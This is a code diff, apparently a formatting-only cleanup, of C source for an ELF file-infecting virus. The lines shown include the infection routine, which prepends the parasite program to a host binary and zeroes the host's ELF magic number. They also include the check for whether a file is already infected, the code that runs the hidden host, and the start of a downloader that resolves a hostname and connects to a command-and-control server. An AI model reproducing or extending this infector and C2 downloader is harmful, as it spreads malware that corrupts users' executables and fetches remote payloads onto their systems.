@@ -42,13 +42,13 @@ int main(int argc, char** argv){
   // if infection target is not infected infect it
   // else execute the infected host file
   if(!is_infected(infection_target)){
-    FILE* host=fopen(infection_target, "rb+");
-    FILE* parasite=fopen(argv[0], "rb");
+    FILE* host = fopen(infection_target, "rb+");
+    FILE* parasite = fopen(argv[0], "rb");
     infect(host, parasite);
     fclose(host);
     fclose(parasite);
   }else{
-    FILE* infected=fopen(argv[0], "rb");
+    FILE* infected = fopen(argv[0], "rb");
     execute_host(infected, argv, environ);
   }
 }
@@ -61,7 +61,7 @@ long elf_size(FILE* f){
   Elf64_Ehdr header;
   fread(&header, 1, sizeof(Elf64_Ehdr), f);
   fseek(f, 0, SEEK_SET);
-  return header.e_shoff+(header.e_shentsize*header.e_shnum);
+  return header.e_shoff + (header.e_shentsize * header.e_shnum);
 }
 
 int is_infected(char* f){
@@ -77,7 +77,7 @@ int is_infected(char* f){
     fseek(file, 0, SEEK_END);
     long f_size = ftell(file);
     fclose(file);
-    if(f_size-e_size != 0){
+    if(f_size - e_size != 0){
       return 1;
     }
   }
@@ -87,8 +87,8 @@ int is_infected(char* f){
 void infect(FILE* h, FILE* p){
   long h_size = elf_size(h);
   long p_size = elf_size(p);
-  char* h_buffer = (char*)malloc(sizeof(char)*h_size);
-  char* p_buffer = (char*)malloc(sizeof(char)*p_size);
+  char* h_buffer = (char*)malloc(sizeof(char) * h_size);
+  char* p_buffer = (char*)malloc(sizeof(char) * p_size);
 
   // the use of 0xFF is arbitary, 256 characters should suffice for common file name length
   char file_link[0xFF];
@@ -100,7 +100,7 @@ void infect(FILE* h, FILE* p){
 
   // replaces the host elf magic number with O's
   for(int i = 0; i < 4; ++i){
-    *(h_buffer + i) = 0;
+    h_buffer[i] = 0;
   }
 
   // write parasite to the beginning of the host file then write host back to itself
@@ -183,7 +183,7 @@ void downloader(){
 
   // resolve hostname to ip addr
   he = gethostbyname(hostname);
-  addr_list = (struct in_addr **) he->h_addr_list;
+  addr_list = (struct in_addr**) he->h_addr_list;
   ip = inet_ntoa(*addr_list[0]);
   
   // set up socket to connect to c2
